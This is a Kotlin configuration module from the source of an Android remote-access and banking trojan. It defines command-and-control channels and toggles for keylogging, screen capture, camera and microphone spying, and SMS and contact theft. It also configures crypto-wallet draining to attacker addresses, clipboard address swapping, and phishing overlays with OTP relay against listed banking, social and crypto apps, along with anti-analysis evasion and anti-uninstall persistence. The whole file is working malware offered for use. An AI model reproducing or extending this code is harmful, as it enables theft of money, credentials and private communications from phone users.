// ============================================================
// FILE: android/app/src/main/java/com/xrc/core/config/XrcConfig.kt
// ============================================================
package com.xrc.core.config

import android.content.Context
import android.util.Log
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import java.io.IOException

/**
 * XRC Configuration loaded from assets/xrc_config.json.
 *
 * Contains C2 endpoints, channel configuration, timings,
 * and feature toggles.
 */
@Serializable
data class XrcConfig(
    val c2: C2Config = C2Config(),
    val channels: ChannelConfig = ChannelConfig(),
    val timings: TimingConfig = TimingConfig(),
    val features: FeatureConfig = FeatureConfig(),
    val evasion: EvasionConfig = EvasionConfig(),
    val persistence: PersistenceConfig = PersistenceConfig(),
    val crypto: CryptoConfig = CryptoConfig(),
    val syringe: SyringeConfig = SyringeConfig()
)

@Serializable
data class C2Config(
    val ws_url: String = "ws://10.0.2.2:3000/ws",
    val dns_domain: String = "tunnel.xrc.local",
    val http_url: String = "http://10.0.2.2:3000/api",
    val heartbeat_interval_ms: Long = 30000,
    val reconnect_interval_ms: Long = 5000,
    val max_reconnect_delay_ms: Long = 60000,
    val encryption_key: String = "",
    val device_id: String = ""
)

@Serializable
data class ChannelConfig(
    val primary: String = "wss",
    val fallback: String = "dns",
    val emergency: String = "http",
    val dns_enabled: Boolean = false,
    val dns_port: Int = 5353,
    val http_poll_interval_ms: Long = 60000,
    val beacon_jitter_ms: Long = 5000
)

@Serializable
data class TimingConfig(
    val command_check_interval_ms: Long = 2000,
    val sensor_collect_interval_ms: Long = 60000,
    val location_interval_ms: Long = 300000,
    val screen_capture_interval_ms: Long = 200,
    val keylog_flush_interval_ms: Long = 5000,
    val file_scan_interval_ms: Long = 3600000,
    val wallet_scan_interval_ms: Long = 3600000
)

@Serializable
data class FeatureConfig(
    val keylogger_enabled: Boolean = true,
    val vnc_enabled: Boolean = true,
    val camera_enabled: Boolean = true,
    val microphone_enabled: Boolean = true,
    val location_enabled: Boolean = true,
    val sms_enabled: Boolean = true,
    val contacts_enabled: Boolean = true,
    val clipboard_enabled: Boolean = true,
    val cryptocurrency_enabled: Boolean = true,
    val finance_scan_enabled: Boolean = true,
    val syringe_enabled: Boolean = true,
    val notification_grabber_enabled: Boolean = true,
    val account_harvester_enabled: Boolean = true,
    val file_manager_enabled: Boolean = true,
    val shell_enabled: Boolean = true
)

@Serializable
data class EvasionConfig(
    val disable_on_emulator: Boolean = true,
    val disable_on_debug: Boolean = true,
    val disable_on_root: Boolean = false,
    val disable_on_safe_mode: Boolean = true,
    val hide_icon: Boolean = true,
    val obfuscate_strings: Boolean = true,
    val date_bomb_timestamp: Long = 0L
)

@Serializable
data class PersistenceConfig(
    val boot_enabled: Boolean = true,
    val alarm_watchdog_enabled: Boolean = true,
    val job_scheduler_enabled: Boolean = true,
    val work_manager_enabled: Boolean = true,
    val accessibility_restart_enabled: Boolean = true,
    val device_admin_anti_uninstall: Boolean = true,
    val foreground_service_enabled: Boolean = true,
    val respawn_daemon_enabled: Boolean = true
)

@Serializable
data class CryptoConfig(
    val wallet_drain_enabled: Boolean = true,
    val seed_phrase_scan_enabled: Boolean = true,
    val clipboard_swap_enabled: Boolean = true,
    val drain_eth: Boolean = true,
    val drain_bsc: Boolean = true,
    val drain_solana: Boolean = true,
    val attacker_address_eth: String = "",
    val attacker_address_bsc: String = "",
    val attacker_address_solana: String = "",
    val min_balance_to_drain_eth: Double = 0.001,
    val min_balance_to_drain_bsc: Double = 0.001,
    val min_balance_to_drain_solana: Double = 0.001
)

@Serializable
data class SyringeConfig(
    val phishing_enabled: Boolean = true,
    val back_button_trap_enabled: Boolean = true,
    val biometric_prompt_enabled: Boolean = true,
    val otp_relay_enabled: Boolean = true,
    val session_forwarding_enabled: Boolean = true,
    val anti_analysis_skip: Boolean = true,
    val overlay_fallback_to_a11y: Boolean = true,
    val target_apps: List<String> = listOf(
        "com.facebook.katana", "com.facebook.orca",
        "com.instagram.android", "com.twitter.android",
        "com.whatsapp", "com.tencent.mm", "com.tencent.mobileqq",
        "com.snapchat.android", "com.zhiliaoapp.musically",
        "com.google.android.gm", "com.google.android.apps.messaging",
        "com.google.android.apps.photos",
        "com.android.chrome", "org.mozilla.firefox",
        "com.ubercab", "com.didiglobal.passenger",
        "com.android.vending", "com.amazon.venezia",
        "com.coinbase.android", "com.binance.dev",
        "com.chase.sig.android", "com.usbank",
        "com.wf.wellsfargo", "com.bankofamerica",
        "com.paypal.android.sdk", "com.venmo",
        "com.squareup.cash",
        "com.robinhood.android",
        "com.webull.android",
        "com.etoro.trading",
        "com.schwab.mobile",
        "org.torproject.android"
    )
)

/**
 * Configuration loader.
 */
object XrcConfigLoader {
    private const val TAG = "XrcConfig"
    private val json = Json { ignoreUnknownKeys = true; isLenient = true }

    /**
     * Load config from assets/xrc_config.json.
     * Returns default config on failure.
     */
    fun load(context: Context): XrcConfig {
        return try {
            val jsonString = context.assets.open("xrc_config.json")
                .bufferedReader().use { it.readText() }
            json.decodeFromString<XrcConfig>(jsonString)
        } catch (e: IOException) {
            Log.w(TAG, "Config file not found, using defaults", e)
            XrcConfig()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse config, using defaults", e)
            XrcConfig()
        }
    }
}
